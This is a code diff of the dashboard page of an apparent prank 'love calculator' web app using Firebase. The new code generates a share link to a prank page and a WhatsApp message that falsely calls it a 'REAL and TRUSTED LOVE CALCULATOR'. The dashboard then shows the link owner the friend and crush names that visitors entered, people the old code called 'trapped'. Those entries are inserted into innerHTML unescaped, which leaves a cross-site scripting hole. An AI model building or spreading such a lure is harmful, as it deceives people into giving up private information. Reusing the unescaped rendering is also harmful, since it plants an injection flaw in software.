@@ -5,11 +5,42 @@
 <title>Dashboard</title>
 <link rel="stylesheet" href="style.css">
 </head>
-<body class="bg center">
 
-<div class="card">
-  <h2>😈 Your Dashboard</h2>
-  <ul id="list"></ul>
+<body class="bg">
+
+<div class="dashboard-center">
+
+  <h2 class="welcome">Welcome 👋</h2>
+
+  <!-- SHARE SECTION -->
+  <div class="card share-card">
+    <p><b>🔗 Your Share Link</b></p>
+
+    <div class="copy-row">
+      <input id="shareLink" readonly>
+      <button class="copy-btn" onclick="copyText('shareLink')">Copy</button>
+    </div>
+
+    <button class="wa-btn" onclick="shareWhatsApp()">Share on WhatsApp status</button>
+  </div>
+
+  <!-- RESULT TABLE -->
+  <div class="card">
+    <h3>💌 Received Entries</h3>
+
+    <table id="table">
+      <tr>
+        <th>Friend</th>
+        <th>Crush</th>
+        <th>Time</th>
+      </tr>
+      <tr>
+        <td colspan="3" class="empty">No entries yet 😅</td>
+      </tr>
+    </table>
+  </div>
+  
+
 </div>
 
 <script type="module">
@@ -30,32 +61,57 @@ const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
 const sid = new URLSearchParams(location.search).get("sid");
-if (!sid) {
-  list.innerHTML = "<li>Invalid dashboard ❌</li>";
-  throw new Error("Invalid sid");
+
+function copyText(id) {
+  const el = document.getElementById(id);
+  el.select();
+  navigator.clipboard.writeText(el.value);
+  alert("Copied ✅");
 }
 
+window.shareWhatsApp = function () {
+  const link = document.getElementById("shareLink").value;
+  const msg = `Calculate your ❤️ *LOVE Percentage* ❤️ using this *REAL and TRUSTED LOVE CALCULATOR* 
+😍👨‍❤️‍👨👇👇👇👨‍❤️‍👨😍\n${link}`;
+  window.open("https://wa.me/?text=" + encodeURIComponent(msg));
+};
+
+// 🔎 Load sender
 const senderSnap = await getDocs(
   query(collection(db,"senders"), where("dashboardId","==",sid))
 );
 
 if (senderSnap.empty) {
-  list.innerHTML = "<li>Dashboard not found ❌</li>";
-  throw new Error("No sender");
+  document.getElementById("table").innerHTML =
+    "<tr><td colspan='3'>Invalid dashboard ❌</td></tr>";
+  throw new Error("Invalid SID");
 }
 
-const receiverId = senderSnap.docs[0].data().receiverId;
+const data = senderSnap.docs[0].data();
+document.querySelector(".welcome").innerText =
+  "Welcome, " + data.senderName + " 👋";
 
+// Set share link
+document.getElementById("shareLink").value =
+  location.origin + "/prank.html?rid=" + data.receiverId;
+
+// Load entries
 const entriesSnap = await getDocs(
-  query(collection(db,"entries"), where("receiverId","==",receiverId))
+  query(collection(db,"entries"), where("receiverId","==",data.receiverId))
 );
 
-if (entriesSnap.empty) {
-  list.innerHTML = "<li>No one trapped yet 😅</li>";
+if (!entriesSnap.empty) {
+  document.querySelector(".empty")?.remove();
 }
 
 entriesSnap.forEach(d=>{
-  list.innerHTML += `<li>${d.data().friend} ❤️ ${d.data().crush}</li>`;
+  const tr = document.createElement("tr");
+  tr.innerHTML = `
+    <td>${d.data().friend}</td>
+    <td>${d.data().crush}</td>
+    <td>${new Date(d.data().time).toLocaleString()}</td>
+  `;
+  document.getElementById("table").appendChild(tr);
 });
 </script>
 
